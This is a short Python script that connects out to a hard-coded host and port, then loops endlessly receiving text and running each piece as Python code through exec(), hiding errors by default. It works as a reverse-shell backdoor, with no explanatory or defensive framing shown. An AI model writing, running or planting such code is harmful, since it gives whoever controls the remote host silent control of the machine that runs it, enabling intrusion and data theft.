import socket as Socket
import sys
import argparse

class client:
    def __init__(self,ip_addr,port, recv=1024,quiet=True):
        #args
        self.ip_addr =ip_addr
        self.port=port
        self.recv = recv
        self.quiet = quiet
        #Init
        self.soc = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)
        self.soc.connect((self.ip_addr, self.port))
        #main
        self.becomeServant()
        self.closeConn()
    def recieveData(self):
        return self.soc.recv(self.recv)
    def log(self,msg):
        if not self.quiet:
            print(msg)
    def sendData(self,data):
        self.soc.sendall(data)
    def closeConn(self):
        self.soc.close()
    def becomeServant(self):
        while True:
            try:
                command = self.recieveData()
                self.log("[%s]>>>%s"%(self.ip_addr,command.decode()))
                command = str(command.decode())
                exec(command)
            except:
                    self.log("[Error for command] %s"%command )
            continue

if __name__ == "__main__":
    parser= argparse.ArgumentParser()
    parser.add_argument("-i","--ip",default= "192.168.31.58",type=str,help=" Specify the Ipv4 defaults to: 192.168.31.58")
    parser.add_argument("-p", "--port", default=50007, type=int, help=" Specify the Port defaults to: 50007")
    args = parser.parse_args()
    MontyPython = client(args.ip,args.port)
    #MontyPython = client('192.168.1.4', 50007)